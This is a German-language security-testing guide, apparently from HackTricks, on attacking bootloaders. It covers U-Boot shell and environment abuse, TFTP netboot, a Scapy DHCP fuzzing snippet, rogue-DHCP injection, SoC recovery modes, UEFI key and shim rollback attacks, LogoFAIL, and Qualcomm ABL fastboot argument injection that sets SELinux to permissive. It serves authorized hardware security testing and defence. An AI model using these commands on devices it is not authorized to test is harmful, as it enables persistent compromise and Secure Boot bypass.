# Bootloader-Tests

{{#include ../../banners/hacktricks-training.md}}

Die folgenden Schritte werden empfohlen, um Gerätestartkonfigurationen zu ändern und Bootloader wie U-Boot und Loader der UEFI-Klasse zu testen. Konzentriere dich darauf, frühzeitig Code auszuführen, Signatur- und Rollback-Schutzmaßnahmen zu bewerten und Recovery- oder Netzwerk-Boot-Pfade auszunutzen.

Verwandt: MediaTek-Secure-Boot-Bypass durch bl2_ext-Patching:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## Schnelle Erfolge mit U-Boot und Missbrauch der Umgebung

1. Auf die Interpreter-Shell zugreifen
   - Drücke während des Bootvorgangs eine bekannte Unterbrechungstaste (häufig eine beliebige Taste, 0, die Leertaste oder eine boardspezifische „Magic“-Tastenkombination), bevor `bootcmd` ausgeführt wird, um zur U-Boot-Eingabeaufforderung zu gelangen.<sup>[[1]](#references)</sup>

2. Bootstatus und Variablen untersuchen
   - Nützliche Befehle:
     - `printenv` (Umgebung ausgeben)
     - `bdinfo` (Board-Informationen, Speicheradressen)
     - `help bootm; help booti; help bootz` (unterstützte Kernel-Boot-Methoden)
     - `help ext4load; help fatload; help tftpboot` (verfügbare Loader)

3. Boot-Argumente ändern, um eine Root-Shell zu erhalten
   - Hänge `init=/bin/sh` an, damit der Kernel eine Shell statt des normalen Init-Prozesses startet:
     ```
     # printenv
     # setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
     # saveenv
     # boot    # or: run bootcmd
     ```

4. Netboot von deinem TFTP-Server
   - Netzwerk konfigurieren und ein Kernel-/FIT-Image aus dem LAN abrufen:
     ```
     # setenv ipaddr 192.168.2.2      # device IP
     # setenv serverip 192.168.2.1    # TFTP server IP
     # saveenv; reset
     # ping ${serverip}
     # tftpboot ${loadaddr} zImage           # kernel
     # tftpboot ${fdt_addr_r} devicetree.dtb # DTB
     # setenv bootargs "${bootargs} init=/bin/sh"
     # booti ${loadaddr} - ${fdt_addr_r}
     ```

5. Änderungen über die Umgebung dauerhaft speichern
   - Wenn der `env`-Speicher nicht schreibgeschützt ist, kannst du die Kontrolle dauerhaft sichern:
     ```
     # setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
     # saveenv
     ```
   - Prüfen Sie Variablen wie `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets`, die Fallback-Pfade beeinflussen. Fehlkonfigurierte Werte können wiederholte Zugriffe auf die Shell ermöglichen.

6. Debug-/unsichere Funktionen prüfen
   - Achten Sie auf: `bootdelay` > 0, deaktiviertes `autoboot`, uneingeschränktes `usb start; fatload usb 0:1 ...`, die Möglichkeit, `loady`/`loads` über die serielle Schnittstelle auszuführen, `env import` von nicht vertrauenswürdigen Medien sowie Kernel/Ramdisks, die ohne Signaturprüfung geladen werden.

7. U-Boot-Image-/Verifizierungsprüfung
   - Falls die Plattform Secure Boot/Verified Boot mit FIT-Images beansprucht, testen Sie sowohl nicht signierte als auch manipulierte Images:
     ```
     # tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
     # tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
     # tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
     ```
   - Das Fehlen von `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` oder das Verhalten des alten `verify=n` ermöglicht oft das Booten beliebiger Payloads.
   - Beschränke dich nicht auf ein einfaches Zulassen/Ablehnen-Ergebnis: Jüngere FIT-Forschung hat gezeigt, dass der Verifizierungspfad selbst eine Pre-Auth-Angriffsfläche sein kann. Führe Negativtests mit extern gespeicherten FIT-Daten (`data-offset`, `data-position`, `data-size`), der Auswahl signierter Konfigurationen, `loadables` und der Verarbeitung von Overlays / `extra-conf` durch.
   - Wenn du einen passenden Quellbaum hast, ist `test/vboot/vboot_test.sh` eine schnelle Möglichkeit, das Verhalten der FIT-Verifizierung in der U-Boot-Sandbox nachzustellen, bevor du echte Hardware verwendest.<sup>[[10]](#references)</sup>

8. Standard Boot (`bootstd`), `extlinux` und Script-Bootflows
   - Bei modernen U-Boot-Builds ist `bootcmd` oft nur ein Wrapper um Standard Boot. Das bedeutet, dass beschreibbare Medien, PXE oder SPI-Flash zur eigentlichen Vertrauensgrenze werden können, selbst wenn die sichtbare Umgebung harmlos aussieht.
   - Die `extlinux`-Bootmeth sucht unter `/` und `/boot` nach `extlinux/extlinux.conf`; die Script-Bootmeth sucht zuerst nach `boot.scr.uimg` und dann nach `boot.scr`. Beim Netzwerk-Boot kann der Script-Dateiname aus `boot_script_dhcp` stammen.
   - Nützliche Befehle für die erste Analyse:
     ```
     # bootflow scan -l
     # bootflow list
     # bootflow select 0; bootflow info -d
     # bootmeth list
     # bootmeth order "extlinux script pxe"
     ```
   - Zu testende Abuse-Cases: vom Angreifer kontrollierte USB-/SD-Medien, die in `boot_targets` früher aufgeführt sind, beschreibbare `/boot/extlinux/extlinux.conf`, ein rogue TFTP-Server, der `boot.scr` bereitstellt, oder die skriptbasierte Ausführung über SPI mithilfe von `script_offset_f`.
   - Wenn die Plattform auf FIT-Verifizierung setzt, stelle sicher, dass Konfigurationen auf Konfigurationsebene signiert sind und nicht nur pro Image; `required-mode=all` ist sicherer, als jeden einzelnen erforderlichen Schlüssel zu akzeptieren.

## Network-Boot-Angriffsfläche (DHCP/PXE) und rogue Server

9. Fuzzing von PXE-/DHCP-Parametern
   - Bei der Verarbeitung von BOOTP/DHCP durch U-Boot im Legacy-Modus gab es bereits Probleme mit der Speichersicherheit. CVE‑2024‑42040 beschreibt beispielsweise eine Offenlegung von Speicherinhalten durch speziell gestaltete DHCP-Antworten, die Bytes aus dem U-Boot-Speicher über das Netzwerk leaken können.<sup>[[4]](#references)</sup> Teste die DHCP-/PXE-Codepfade mit überlangen Werten und Randfällen (Option 67 `bootfile-name`, Vendor-Optionen, `file`-/`servername`-Felder) und achte auf Hänger oder Leaks.
   - Minimales Scapy-Snippet, um Boot-Parameter während des Netboots zu testen:
     ```python
     from scapy.all import *
     offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
              IP(src='192.168.2.1', dst='255.255.255.255')/
              UDP(sport=67, dport=68)/
              BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
              DHCP(options=[('message-type','offer'),
                            ('server_id','192.168.2.1'),
                            # Intentionally oversized and strange values
                            ('bootfile_name','A'*300),
                            ('vendor_class_id','B'*240),
                            'end']))
     sendp(offer, iface='eth0', loop=1, inter=0.2)
     ```
   - Prüfe außerdem, ob PXE-Dateinamenfelder ohne Bereinigung an Shell-/Loader-Logik übergeben werden, wenn sie mit Provisioning-Skripten auf Betriebssystemebene verkettet sind.

10. Test auf Command Injection über einen Rogue-DHCP-Server
   - Richte einen Rogue-DHCP-/PXE-Dienst ein und versuche, Zeichen in Datei- oder Optionsfelder einzuschleusen, um in späteren Phasen der Boot-Kette Kommandointerpreter zu erreichen. Metasploits DHCP-Auxiliary-Modul, `dnsmasq` oder benutzerdefinierte Scapy-Skripte eignen sich dafür gut. Isoliere zuerst das Labornetzwerk.

## SoC-ROM-Recovery-Modi, die den normalen Bootvorgang überschreiben

Viele SoCs bieten einen BootROM-„Loader“-Modus, der Code über USB/UART akzeptiert, selbst wenn Flash-Images ungültig sind. Wenn die Secure-Boot-Fuses nicht programmiert sind, kann dies sehr früh in der Boot-Kette beliebige Codeausführung ermöglichen.

- NXP i.MX (Serial Download Mode)
  - Tools: `uuu` (mfgtools3) oder `imx-usb-loader`.
  - Beispiel: `imx-usb-loader u-boot.imx`, um ein benutzerdefiniertes U-Boot aus dem RAM zu laden und auszuführen.
- Allwinner (FEL)
  - Tool: `sunxi-fel`.
  - Beispiel: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` oder `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
  - Tool: `rkdeveloptool`.
  - Beispiel: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin`, um einen Loader bereitzustellen und ein benutzerdefiniertes U-Boot hochzuladen.

Prüfe, ob die Secure-Boot-eFuses/OTP des Geräts programmiert sind. Falls nicht, umgehen BootROM-Downloadmodi häufig sämtliche Prüfungen höherer Ebenen (U-Boot, Kernel, Rootfs), indem sie dein First-Stage-Payload direkt aus SRAM/DRAM ausführen.

## UEFI-/PC-Bootloader: Schnellprüfungen

11. Tests auf ESP-Manipulation, Rollback und Schlüsselregistrierung
   - Binde die EFI-Systempartition (ESP) ein und prüfe auf Loader-Komponenten: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, Herstellerlogo-Pfade.
   - Lies nach Möglichkeit den Secure-Boot-Status und die Schlüssel-Datenbanken aus dem Betriebssystem aus:
     ```bash
     mokutil --sb-state
     efi-readvar -v PK
     efi-readvar -v KEK
     efi-readvar -v db
     efi-readvar -v dbx
     ```
   - Wenn sich die Plattform im Setup Mode befindet, die Registrierung von Schlüsseln ohne Authentifizierung zulässt oder mit einem Test-/Standard-Platform-Key ausgeliefert wird (PKfail-Klasse), kann ein lokaler Admin oder Angreifer mit physischem Zugriff eigene KEK/db-Schlüssel registrieren und Secure Boot weiterhin als „aktiviert“ erscheinen lassen, während beliebige EFI-Binaries gestartet werden.<sup>[[3]](#references)</sup>
   - Versuche, mit heruntergestuften oder bekanntermaßen anfälligen signierten Boot-Komponenten zu starten, wenn die Secure-Boot-Sperrlisten (dbx) nicht aktuell sind. Wenn die Plattform alten shims/bootmanagers weiterhin vertraut, kannst du oft deinen eigenen Kernel oder eine `grub.cfg` von der ESP laden, um Persistenz zu erlangen.

12. Tests auf veraltete shim-/SBAT-/dbx-Sperrungen
   - Alte, von Microsoft signierte shims und Hersteller-Forks können bei veralteten Sperrlisten weiterhin als BYOVD-artiger Bootkit-Pfad dienen. Lege in einem isolierten Lab einen historisch anfälligen shim auf der ESP ab und versuche, deine eigene `grubx64.efi` oder deinen eigenen Kernel per Chainloading zu starten.<sup>[[11]](#references)</sup>
   - Schnelle Ersteinschätzung:
     ```bash
     sbverify --list shimx64.efi
     objdump -s -j .sbat shimx64.efi | less
     efibootmgr -v
     ```
   - Wenn der shim trotz seines Eintrags in der Revocation List weiterhin ausgeführt wird, sind die `dbx`-Updates der Firmware/des Betriebssystems veraltet oder es wird einem geforkten Loader vertraut, der die upstream SBAT-Schutzmechanismen nie übernommen hat.

13. Fehler beim Parsen von Boot-Logos (Klasse LogoFAIL)
   - Mehrere OEM-/IBV-Firmwares waren anfällig für Fehler beim Parsen von Bildern in DXE, die Boot-Logos verarbeiten. Wenn ein Angreifer ein präpariertes Bild unter einem herstellerspezifischen Pfad auf der ESP ablegen kann (z. B. `\EFI\<vendor>\logo\*.bmp`) und das Gerät neu startet, kann eine Codeausführung während des frühen Bootvorgangs möglich sein, selbst wenn Secure Boot aktiviert ist. Teste, ob die Plattform vom Benutzer bereitgestellte Logos akzeptiert und ob diese Pfade vom Betriebssystem aus beschreibbar sind.<sup>[[2]](#references)</sup>


## Android/Qualcomm ABL + GBL (Android 16) Vertrauenslücken

Prüfe bei Android-16-Geräten, die Qualcomms ABL zum Laden der **Generic Bootloader Library (GBL)** verwenden, ob ABL die UEFI-App **authentifiziert**, die es von der `efisp`-Partition lädt. Prüft ABL lediglich, ob eine UEFI-App **vorhanden** ist, ohne Signaturen zu verifizieren, ermöglicht eine Schreibprimitive für `efisp` die **Ausführung unsignierten Codes vor dem Betriebssystemstart**.<sup>[[6]](#references)[[7]](#references)</sup>

Praktische Prüfungen und Angriffsmöglichkeiten:

- **efisp write primitive**: Du brauchst eine Möglichkeit, eine eigene UEFI-App in `efisp` zu schreiben (Root/Zugriff eines privilegierten Dienstes, Fehler in einer OEM-App, Recovery-/fastboot-Pfad). Ohne diese Möglichkeit ist die GBL-Ladelücke nicht direkt ausnutzbar.<sup>[[6]](#references)</sup>
- **fastboot OEM argument injection** (ABL bug): Einige Builds akzeptieren zusätzliche Tokens in `fastboot oem set-gpu-preemption` und hängen sie an die Kernel-Kommandozeile an. Damit lässt sich SELinux in den permissive-Modus versetzen, wodurch Schreibzugriffe auf geschützte Partitionen möglich werden:
  ```bash
  fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
  ```
  Wenn das Gerät gepatcht ist, sollte der Befehl zusätzliche Argumente ablehnen.<sup>[[5]](#references)[[6]](#references)</sup>
- **Bootloader-Unlock über persistente Flags**: Ein Payload in einer Bootstufe kann persistente Unlock-Flags (z. B. `is_unlocked=1`, `is_unlocked_critical=1`) umschalten und so `fastboot oem unlock` ohne OEM-Server oder Genehmigungsschranken nachbilden. Dadurch wird der Sicherheitszustand nach dem nächsten Neustart dauerhaft geändert.<sup>[[6]](#references)</sup>

Hinweise zur Abwehr und Triage:

- Prüfe, ob ABL Signaturprüfungen für den GBL-/UEFI-Payload aus `efisp` durchführt. Ist das nicht der Fall, behandle `efisp` als Angriffsfläche mit hohem Persistenzrisiko.
- Prüfe, ob ABL-fastboot-OEM-Handler so gepatcht sind, dass sie **die Anzahl der Argumente validieren** und zusätzliche Tokens ablehnen.<sup>[[8]](#references)[[9]](#references)</sup>

## Hardware-Vorsicht

Sei beim Umgang mit SPI-/NAND-Flash während des frühen Bootvorgangs vorsichtig (z. B. beim Erden von Pins, um Lesevorgänge zu umgehen), und konsultiere immer das Flash-Datenblatt. Kurzschlüsse zum falschen Zeitpunkt können das Gerät oder den Programmer beschädigen.

## Hinweise und zusätzliche Tipps

- Probiere `env export -t ${loadaddr}` und `env import -t ${loadaddr}` aus, um Umgebungs-Blobs zwischen RAM und Speicher zu übertragen; bei manchen Plattformen kann die Umgebung ohne Authentifizierung von Wechselmedien importiert werden.
- Für Persistenz auf Linux-basierten Systemen, die über `extlinux.conf` booten, reicht es oft, die `APPEND`-Zeile auf der Bootpartition zu ändern (um `init=/bin/sh` oder `rd.break` einzuschleusen), wenn keine Signaturprüfungen erzwungen werden.
- Wenn das Zielgerät Dual-Slot-Updates / A/B-Updates nutzt, sieh dir die Anti-Rollback- und Slot-Desync-Techniken in der [Firmware-Analyse-Übersicht](README.md) an, damit dir keine Trust-Lücken entgehen, die nur den Updater und nicht den Bootloader selbst betreffen.
- Wenn der Userspace `fw_printenv/fw_setenv` bereitstellt, prüfe, ob `/etc/fw_env.config` dem tatsächlichen Speicherort der Umgebung entspricht. Falsch konfigurierte Offsets können dazu führen, dass du die falsche MTD-Region liest oder beschreibst.

## References

- [1] [Methodik zum Testen der Firmware-Sicherheit](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [2] [LogoFAIL entdeckt: Die Gefahren der Bildverarbeitung während des Systemstarts](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [3] [PKfail: Nicht vertrauenswürdige Plattformschlüssel untergraben Secure Boot im UEFI-Ökosystem](https://www.binarly.io/blog/pkfail-untrusted-platform-keys-undermine-secure-boot-on-uefi-ecosystem)
- [4] [Details zu CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [5] [Zuvorgekommen: Xiaomi durch zwei nicht bereinigte Zeichenketten entsperren](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [6] [Exploit für Qualcomm Snapdragon 8 Elite GBL ermöglicht Angreifern das Entsperren von Bootloadern](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [7] [Architektur des Generic Bootloader (GBL)](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [8] [QcomModulePkg: Weitergabe nicht vertrauenswürdiger Eingaben an die Kernel-Befehlszeile beheben](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [9] [QcomModulePkg: Prüfung für den Befehl set-hw-fence-value hinzufügen](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [10] [Nicht bootfähig: Signaturprüfung von U-Boots FIT aufbrechen](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [11] [Sicherheitslückenhinweis VU#616257 – Microsoft-signierte UEFI-Shim-Bootloader sind anfällig für Secure-Boot-Umgehungen](https://kb.cert.org/vuls/id/616257)
{{#include ../../banners/hacktricks-training.md}}
